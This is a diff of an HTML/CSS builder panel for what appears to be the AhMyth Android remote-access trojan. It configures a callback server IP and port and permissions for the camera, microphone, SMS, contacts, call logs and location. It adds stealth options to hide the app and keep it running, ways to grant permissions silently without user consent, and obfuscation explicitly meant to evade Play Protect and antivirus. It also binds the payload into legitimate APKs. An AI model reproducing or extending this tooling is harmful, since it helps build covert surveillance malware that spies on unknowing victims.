@@ -1,128 +1,717 @@
-<div class="ui segment h100">
+<div class="builder-panel">
+    <!-- Server Configuration -->
+    <div class="builder-section">
+        <h3 class="builder-section__title">
+            <i class="server icon"></i>
+            Server Configuration
+        </h3>
+        <div class="builder-form">
+            <div class="builder-form__group">
+                <label class="builder-form__label">Server IP</label>
+                <input type="text" class="builder-form__input" ng-model="srcIP" placeholder="192.168.0.227" ng-init="srcIP = srcIP || '192.168.0.227'">
+                <span class="builder-form__hint">Your public or local IP address</span>
+            </div>
+            <div class="builder-form__group">
+                <label class="builder-form__label">Port</label>
+                <input type="number" class="builder-form__input" ng-model="srcPort" min="1025" max="65535" placeholder="1234" ng-init="srcPort = srcPort || 1234">
+                <span class="builder-form__hint">Must match the listening port</span>
+            </div>
+        </div>
+    </div>
 
-    <table class="ui very compact table">
-        <thead>
-            <tr class="center aligned">
-                <th colspan="2">APK Configuration</th>
-            </tr>
-        </thead>
-        <tbody>
-            <tr class="center aligned">
-                <td>
-                    <div class="ui labeled fluid input ">
-                        <div class="ui black label">
-                            Server IP
-                        </div>
-                        <input ng-model="srcIP" type="text" placeholder="188.132.xxx.xxx">
-                    </div>
-                </td>
+    <!-- Permissions -->
+    <div class="builder-section">
+        <h3 class="builder-section__title">
+            <i class="shield icon"></i>
+            Permissions
+        </h3>
+        <p class="builder-section__desc">Select which features to enable in the payload</p>
+        
+        <div class="permissions-grid">
+            <label class="permission-item">
+                <input type="checkbox" id="Permissions1" value="CameraPer">
+                <span>Camera</span>
+            </label>
+            <label class="permission-item">
+                <input type="checkbox" id="Permissions2" value="StoragePer">
+                <span>Storage</span>
+            </label>
+            <label class="permission-item">
+                <input type="checkbox" id="Permissions3" value="MicPer">
+                <span>Microphone</span>
+            </label>
+            <label class="permission-item">
+                <input type="checkbox" id="Permissions4" value="LocationPer">
+                <span>Location</span>
+            </label>
+            <label class="permission-item">
+                <input type="checkbox" id="Permissions5" value="ContactsPer">
+                <span>Contacts</span>
+            </label>
+            <label class="permission-item">
+                <input type="checkbox" id="Permissions6" value="SMSPer">
+                <span>SMS</span>
+            </label>
+            <label class="permission-item">
+                <input type="checkbox" id="Permissions7" value="CallsLogsPer">
+                <span>Call Logs</span>
+            </label>
+            <label class="permission-item">
+                <input type="checkbox" id="Permissions8" value="WifiPer" checked>
+                <span>WiFi Info</span>
+            </label>
+        </div>
+    </div>
 
-                <td>
-                    <div class="ui labeled fluid input ">
-                        <input ng-model="srcPort" type="number" min="1025" max="65535" placeholder="default is 42474">
-                        <div class="ui black label">
-                            Server Port
-                        </div>
-                    </div>
-                </td>
+    <!-- Stealth Options -->
+    <div class="builder-section">
+        <h3 class="builder-section__title">
+            <i class="eye slash icon"></i>
+            Stealth Options
+        </h3>
+        <p class="builder-section__desc">Configure how the app hides itself on the device</p>
+        
+        <div class="stealth-grid">
+            <label class="stealth-item">
+                <input type="checkbox" ng-model="stealthOptions.hideIcon" id="hideIcon">
+                <span>Hide App Icon</span>
+                <small>Remove from launcher</small>
+            </label>
+            <label class="stealth-item">
+                <input type="checkbox" ng-model="stealthOptions.hideFromRecents" id="hideRecents">
+                <span>Hide from Recents</span>
+                <small>Exclude from app switcher</small>
+            </label>
+            <label class="stealth-item">
+                <input type="checkbox" ng-model="stealthOptions.startOnBoot" id="startBoot" checked>
+                <span>Start on Boot</span>
+                <small>Auto-start after restart</small>
+            </label>
+            <label class="stealth-item">
+                <input type="checkbox" ng-model="stealthOptions.silentNotification" id="silentNotif">
+                <span>Silent Mode</span>
+                <small>Minimal notification</small>
+            </label>
+            <label class="stealth-item">
+                <input type="checkbox" ng-model="stealthOptions.persistentService" id="persistent" checked>
+                <span>Persistent</span>
+                <small>Auto-restart if killed</small>
+            </label>
+            <label class="stealth-item">
+                <input type="checkbox" ng-model="stealthOptions.wakelock" id="wakelock" checked>
+                <span>Wake Lock</span>
+                <small>Keep running in background</small>
+            </label>
+        </div>
+        
+        <div class="stealth-note">
+            <i class="info circle icon"></i>
+            Dial <strong>*#*#1337#*#*</strong> to unhide the app on the target device
+        </div>
+    </div>
 
-            </tr>
-        </tbody>
-    </table>
-    <table class="ui very compact table">
-        <thead>
-            <tr class="center aligned">
-                <th colspan="8">Permissions Customization</th>
-            </tr>
-        </thead>
-        <tbody>
-            <tr class="center aligned">
-                <td>
-                    <div class="ui checkbox">
-                        <input type="checkbox" id="Permissions1" value="CameraPer">
-                        <label>Camera</label>
-                    </div>
-                </td>
-                <td>
-                    <div class="ui checkbox">
-                        <input type="checkbox" id="Permissions2" value="StoragePer">
-                        <label>Storage</label>
-                    </div>
-                </td>
-                <td>
-                    <div class="ui checkbox">
-                        <input type="checkbox" id="Permissions3" value="MicPer">
-                        <label>Mic</label>
-                    </div>
-                </td>
-                <td>
-                    <div class="ui checkbox">
-                        <input type="checkbox" id="Permissions4" value="LocationPer">
-                        <label>Location</label>
-                    </div>
-                </td>
-                <td>
-                    <div class="ui checkbox">
-                        <input type="checkbox" id="Permissions5" value="ContactsPer">
-                        <label>Contacts</label>
-                    </div>
-                </td>
-                <td>
-                    <div class="ui checkbox">
-                        <input type="checkbox" id="Permissions6" value="SMSPer">
-                        <label>SMS</label>
-                    </div>
-                </td>
-                <td>
-                    <div class="ui checkbox">
-                        <input type="checkbox" id="Permissions7" value="CallsLogsPer">
-                        <label>CallsLogs</label>
-                    </div>
-                </td>
-            </tr>
-        </tbody>
-    </table>
-    <table class="ui very compact table">
-        <thead>
-            <tr class="center aligned">
-                <th colspan="3">
-                    <div class="ui checkbox ">
-                        <input ng-model="bindApk.enable" type="checkbox" name="bind">
-                        <label>Bind With An Original Apk</label>
-                    </div>
-                </th>
-            </tr>
-        </thead>
-        <tbody ng-hide="!bindApk.enable">
-            <tr class="center aligned">
-                <td>
-                    <div class="ui radio checkbox">
-                        <input type="radio" name="method" checked="checked" ng-model="bindApk.method" value="BOOT">
-                        <label>Boot Method</label>
-                        <span style="font-size: 14px ;color: red">Device restart required</span>
-                    </div>
-                </td>
-                <td>
-                    <button ng-click="clearLogs(); BrowseApk()" ng-disabled="!bindApk.enable"
-                        class="ui black labeled icon button "><i class="android icon"></i>Browse Apk</button>
-                </td>
-                <td>
-                    <div class="ui radio checkbox">
+    <!-- Silent Permissions -->
+    <div class="builder-section">
+        <h3 class="builder-section__title">
+            <i class="magic icon"></i>
+            Silent Permissions
+        </h3>
+        <p class="builder-section__desc">Methods to automatically grant permissions without user interaction</p>
+        
+        <div class="silent-perm-grid">
+            <label class="silent-perm-item">
+                <input type="checkbox" ng-model="silentPermOptions.generateAdbScript" id="genAdbScript" checked>
+                <span>Generate ADB Script</span>
+                <small>Creates a script to grant all permissions via ADB</small>
+            </label>
+            <label class="silent-perm-item">
+                <input type="checkbox" ng-model="silentPermOptions.skipPrompts" id="skipPrompts">
+                <span>Skip Permission Prompts</span>
+                <small>Request permissions silently (may not show dialogs)</small>
+            </label>
+            <label class="silent-perm-item">
+                <input type="checkbox" ng-model="silentPermOptions.useAccessibility" id="useAccessibility">
+                <span>Auto-Grant Service</span>
+                <small>Use accessibility to auto-tap grant buttons</small>
+            </label>
+            <label class="silent-perm-item">
+                <input type="checkbox" ng-model="silentPermOptions.deviceOwner" id="deviceOwner">
+                <span>Device Owner Mode</span>
+                <small>Full control if provisioned as device owner</small>
+            </label>
+        </div>
+        
+        <div class="silent-perm-info">
+            <i class="lightbulb icon"></i>
+            <div>
+                <strong>ADB Command (after install):</strong>
+                <code>adb shell pm grant ahmyth.mine.king.ahmyth &lt;permission&gt;</code>
+            </div>
+        </div>
+    </div>
+
+    <!-- Obfuscation -->
+    <div class="builder-section">
+        <h3 class="builder-section__title">
+            <i class="shield alternate icon"></i>
+            Obfuscation & Anti-Detection
+        </h3>
+        <p class="builder-section__desc">Make each build unique to bypass Play Protect and AV detection</p>
+        
+        <div class="obfuscation-grid">
+            <label class="obfuscation-item">
+                <input type="checkbox" ng-model="obfuscationOptions.randomizePackage" id="randPkg" checked>
+                <span>Randomize Package Name</span>
+                <small>Generate unique package identifier</small>
+            </label>
+            <label class="obfuscation-item">
+                <input type="checkbox" ng-model="obfuscationOptions.randomizeAppName" id="randApp" checked>
+                <span>Randomize App Name</span>
+                <small>Generate innocent-looking app name</small>
+            </label>
+            <label class="obfuscation-item">
+                <input type="checkbox" ng-model="obfuscationOptions.injectJunk" id="injectJunk" checked>
+                <span>Inject Junk Code</span>
+                <small>Add random unused classes</small>
+            </label>
+            <label class="obfuscation-item">
+                <input type="checkbox" ng-model="obfuscationOptions.randomizeVersion" id="randVer" checked>
+                <span>Randomize Version</span>
+                <small>Unique version code each build</small>
+            </label>
+            <label class="obfuscation-item">
+                <input type="checkbox" ng-model="obfuscationOptions.addMetadata" id="addMeta" checked>
+                <span>Add Random Metadata</span>
+                <small>Include random asset files</small>
+            </label>
+            <label class="obfuscation-item">
+                <input type="checkbox" ng-model="obfuscationOptions.modifySignature" id="modSig" checked>
+                <span>Unique Build Signature</span>
+                <small>Different hash each build</small>
+            </label>
+        </div>
+        
+        <div class="obfuscation-custom">
+            <div class="custom-field">
+                <label>Custom Package Name (optional)</label>
+                <input type="text" ng-model="obfuscationOptions.customPackage" placeholder="e.g., com.google.backup">
+            </div>
+            <div class="custom-field">
+                <label>Custom App Name (optional)</label>
+                <input type="text" ng-model="obfuscationOptions.customAppName" placeholder="e.g., System Service">
+            </div>
+        </div>
+        
+        <div class="obfuscation-preview" ng-if="obfuscationOptions.randomizePackage || obfuscationOptions.randomizeAppName">
+            <i class="eye icon"></i>
+            <span>Preview: <strong>{{previewPackage || 'com.google.service'}}</strong> / <strong>{{previewAppName || 'System Helper'}}</strong></span>
+            <button class="btn btn--small" ng-click="regeneratePreview()">
+                <i class="sync icon"></i> Regenerate
+            </button>
+        </div>
+    </div>
+
+    <!-- Bind APK -->
+    <div class="builder-section">
+        <h3 class="builder-section__title">
+            <i class="linkify icon"></i>
+            APK Binding
+        </h3>
+        
+        <label class="bind-toggle">
+            <input type="checkbox" ng-model="bindApk.enable" name="bind">
+            <span class="bind-toggle__switch"></span>
+            <span class="bind-toggle__label">Bind payload with existing APK</span>
+        </label>
+
+        <div ng-show="bindApk.enable" class="bind-options">
+            <div class="bind-method">
+                <label class="builder-form__label">Injection Method</label>
+                <div class="method-buttons">
+                    <label class="method-btn" ng-class="{'method-btn--active': bindApk.method === 'BOOT'}">
+                        <input type="radio" name="method" ng-model="bindApk.method" value="BOOT">
+                        <span>Boot</span>
+                    </label>
+                    <label class="method-btn" ng-class="{'method-btn--active': bindApk.method === 'ACTIVITY'}">
                         <input type="radio" name="method" ng-model="bindApk.method" value="ACTIVITY">
-                        <label>Activity Method</label>
-                        <span style="font-size: 14px ;color: red">Doesn't work on all apps</span>
-                    </div>
-                </td>
-        </tbody>
-        <tfoot class="half-width">
-            <tr class="center aligned">
-                <th colspan="3">
-                    <button ng-click="clearLogs(); Build(srcIP,srcPort)" ng-hide="bindApk.enable" ng-show="Build"
-                        class="ui labeled icon red button"><i class="hammer icon"></i>Build</button>
-                    <button ng-click="clearLogs(); Build(srcIP,srcPort)" ng-hide="Build" ng-show=bindApk.enable
-                        class="ui labeled icon green button"><i class="screwdriver icon"></i>Bind</button>
-                </th>
-            </tr>
-        </tfoot>
-    </table>
+                        <span>Activity</span>
+                    </label>
+                </div>
+            </div>
+
+            <button class="btn btn--secondary" ng-click="clearLogs(); BrowseApk()" ng-disabled="!bindApk.enable">
+                <i class="android icon"></i>
+                Browse APK
+            </button>
+            <span class="selected-file" ng-if="filePath">{{fileName}}</span>
+        </div>
+    </div>
+
+    <!-- Build Button -->
+    <div class="builder-actions">
+        <button class="build-btn" 
+                ng-click="clearLogs(); Build(srcIP, srcPort)" 
+                ng-disabled="!srcIP || !srcPort || (bindApk.enable && !filePath)">
+            <i class="hammer icon"></i>
+            <span ng-if="!bindApk.enable">Build APK</span>
+            <span ng-if="bindApk.enable">Bind & Build</span>
+        </button>
+    </div>
 </div>
+
+<style>
+    .builder-panel {
+        max-width: 700px;
+        margin: 0 auto;
+        padding: 16px;
+    }
+    
+    .builder-section {
+        margin-bottom: 16px;
+        padding: 16px;
+        background: var(--bg-secondary);
+        border: 1px solid var(--border-color);
+        border-radius: 8px;
+    }
+    
+    .builder-section__title {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        margin: 0 0 12px;
+        font-size: 14px;
+        font-weight: 600;
+        color: var(--text-primary);
+    }
+    
+    .builder-section__title i {
+        color: var(--accent-primary);
+    }
+    
+    .builder-section__desc {
+        margin: 0 0 12px;
+        font-size: 12px;
+        color: var(--text-secondary);
+    }
+    
+    /* Form */
+    .builder-form {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 12px;
+    }
+    
+    .builder-form__group {
+        display: flex;
+        flex-direction: column;
+        gap: 4px;
+    }
+    
+    .builder-form__label {
+        font-size: 11px;
+        font-weight: 500;
+        color: var(--text-secondary);
+        text-transform: uppercase;
+    }
+    
+    .builder-form__input {
+        padding: 8px 10px;
+        background: var(--bg-primary);
+        border: 1px solid var(--border-color);
+        border-radius: 6px;
+        color: var(--text-primary);
+        font-size: 13px;
+        font-family: var(--font-mono);
+    }
+    
+    .builder-form__input:focus {
+        outline: none;
+        border-color: var(--accent-primary);
+    }
+    
+    .builder-form__hint {
+        font-size: 11px;
+        color: var(--text-muted);
+    }
+    
+    /* Permissions */
+    .permissions-grid {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 8px;
+    }
+    
+    .permission-item {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding: 8px 10px;
+        background: var(--bg-primary);
+        border: 1px solid var(--border-color);
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 12px;
+        color: var(--text-primary);
+    }
+    
+    .permission-item:hover {
+        border-color: var(--accent-primary);
+    }
+    
+    .permission-item input[type="checkbox"] {
+        width: 14px;
+        height: 14px;
+        accent-color: var(--accent-primary);
+    }
+    
+    /* Stealth */
+    .stealth-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 8px;
+    }
+    
+    .stealth-item {
+        display: flex;
+        flex-direction: column;
+        gap: 2px;
+        padding: 10px 12px;
+        background: var(--bg-primary);
+        border: 1px solid var(--border-color);
+        border-radius: 6px;
+        cursor: pointer;
+    }
+    
+    .stealth-item:hover {
+        border-color: var(--accent-primary);
+    }
+    
+    .stealth-item input[type="checkbox"] {
+        position: absolute;
+        opacity: 0;
+    }
+    
+    .stealth-item input:checked ~ span {
+        color: var(--accent-primary);
+    }
+    
+    .stealth-item span {
+        font-size: 12px;
+        font-weight: 500;
+        color: var(--text-primary);
+    }
+    
+    .stealth-item small {
+        font-size: 10px;
+        color: var(--text-muted);
+    }
+    
+    .stealth-note {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        margin-top: 12px;
+        padding: 10px 12px;
+        background: var(--bg-primary);
+        border-radius: 6px;
+        font-size: 12px;
+        color: var(--text-secondary);
+    }
+    
+    .stealth-note i {
+        color: var(--accent-info);
+    }
+    
+    .stealth-note strong {
+        color: var(--text-primary);
+        font-family: var(--font-mono);
+    }
+    
+    /* Silent Permissions */
+    .silent-perm-grid {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 10px;
+    }
+    
+    .silent-perm-item {
+        display: flex;
+        flex-direction: column;
+        padding: 12px;
+        background: var(--bg-primary);
+        border: 1px solid var(--border-color);
+        border-radius: 6px;
+        cursor: pointer;
+        transition: all 0.2s;
+    }
+    
+    .silent-perm-item:hover {
+        border-color: var(--accent-warning);
+    }
+    
+    .silent-perm-item input {
+        display: none;
+    }
+    
+    .silent-perm-item input:checked + span {
+        color: var(--accent-warning);
+    }
+    
+    .silent-perm-item span {
+        font-size: 12px;
+        font-weight: 500;
+        color: var(--text-primary);
+        margin-bottom: 2px;
+    }
+    
+    .silent-perm-item small {
+        font-size: 10px;
+        color: var(--text-muted);
+    }
+    
+    .silent-perm-info {
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+        margin-top: 12px;
+        padding: 12px;
+        background: rgba(210, 153, 34, 0.1);
+        border: 1px solid rgba(210, 153, 34, 0.3);
+        border-radius: 6px;
+    }
+    
+    .silent-perm-info i {
+        color: var(--accent-warning);
+        margin-top: 2px;
+    }
+    
+    .silent-perm-info code {
+        display: block;
+        margin-top: 6px;
+        padding: 6px 10px;
+        background: var(--bg-primary);
+        border-radius: 4px;
+        font-size: 11px;
+        font-family: var(--font-mono);
+        color: var(--text-secondary);
+    }
+    
+    /* Obfuscation */
+    .obfuscation-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 10px;
+    }
+    
+    .obfuscation-item {
+        display: flex;
+        flex-direction: column;
+        padding: 12px;
+        background: var(--bg-primary);
+        border: 1px solid var(--border-color);
+        border-radius: 6px;
+        cursor: pointer;
+        transition: all 0.2s;
+    }
+    
+    .obfuscation-item:hover {
+        border-color: var(--accent-success);
+    }
+    
+    .obfuscation-item input {
+        display: none;
+    }
+    
+    .obfuscation-item input:checked + span {
+        color: var(--accent-success);
+    }
+    
+    .obfuscation-item span {
+        font-size: 12px;
+        font-weight: 500;
+        color: var(--text-primary);
+        margin-bottom: 2px;
+    }
+    
+    .obfuscation-item small {
+        font-size: 10px;
+        color: var(--text-muted);
+    }
+    
+    .obfuscation-custom {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 12px;
+        margin-top: 12px;
+        padding-top: 12px;
+        border-top: 1px solid var(--border-color);
+    }
+    
+    .custom-field label {
+        display: block;
+        font-size: 11px;
+        color: var(--text-secondary);
+        margin-bottom: 4px;
+    }
+    
+    .custom-field input {
+        width: 100%;
+        padding: 8px 10px;
+        background: var(--bg-primary);
+        border: 1px solid var(--border-color);
+        border-radius: 6px;
+        color: var(--text-primary);
+        font-size: 12px;
+    }
+    
+    .custom-field input:focus {
+        outline: none;
+        border-color: var(--accent-success);
+    }
+    
+    .obfuscation-preview {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-top: 12px;
+        padding: 10px 12px;
+        background: rgba(63, 185, 80, 0.1);
+        border: 1px solid rgba(63, 185, 80, 0.3);
+        border-radius: 6px;
+        font-size: 12px;
+        color: var(--text-secondary);
+    }
+    
+    .obfuscation-preview i {
+        color: var(--accent-success);
+    }
+    
+    .obfuscation-preview strong {
+        color: var(--accent-success);
+        font-family: var(--font-mono);
+    }
+    
+    /* Bind */
+    .bind-toggle {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        cursor: pointer;
+    }
+    
+    .bind-toggle input {
+        display: none;
+    }
+    
+    .bind-toggle__switch {
+        width: 36px;
+        height: 20px;
+        background: var(--bg-tertiary);
+        border-radius: 10px;
+        position: relative;
+        transition: background 0.2s;
+    }
+    
+    .bind-toggle__switch::after {
+        content: '';
+        position: absolute;
+        width: 16px;
+        height: 16px;
+        background: var(--text-muted);
+        border-radius: 50%;
+        top: 2px;
+        left: 2px;
+        transition: all 0.2s;
+    }
+    
+    .bind-toggle input:checked + .bind-toggle__switch {
+        background: var(--accent-primary);
+    }
+    
+    .bind-toggle input:checked + .bind-toggle__switch::after {
+        left: 18px;
+        background: #fff;
+    }
+    
+    .bind-toggle__label {
+        font-size: 13px;
+        color: var(--text-primary);
+    }
+    
+    .bind-options {
+        margin-top: 12px;
+        padding-top: 12px;
+        border-top: 1px solid var(--border-color);
+    }
+    
+    .bind-method {
+        margin-bottom: 12px;
+    }
+    
+    .method-buttons {
+        display: flex;
+        gap: 8px;
+        margin-top: 6px;
+    }
+    
+    .method-btn {
+        padding: 6px 16px;
+        background: var(--bg-primary);
+        border: 1px solid var(--border-color);
+        border-radius: 6px;
+        font-size: 12px;
+        color: var(--text-secondary);
+        cursor: pointer;
+    }
+    
+    .method-btn input {
+        display: none;
+    }
+    
+    .method-btn--active {
+        background: var(--accent-primary);
+        border-color: var(--accent-primary);
+        color: #fff;
+    }
+    
+    .selected-file {
+        margin-left: 10px;
+        font-size: 12px;
+        color: var(--accent-success);
+    }
+    
+    /* Build Button */
+    .builder-actions {
+        display: flex;
+        justify-content: center;
+        padding: 16px 0;
+    }
+    
+    .build-btn {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding: 12px 32px;
+        background: var(--accent-primary);
+        border: none;
+        border-radius: 8px;
+        color: #fff;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.15s;
+    }
+    
+    .build-btn:hover:not(:disabled) {
+        background: #4c9aed;
+    }
+    
+    .build-btn:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+    }
+    
+    .build-btn i {
+        font-size: 16px;
+    }
+</style>
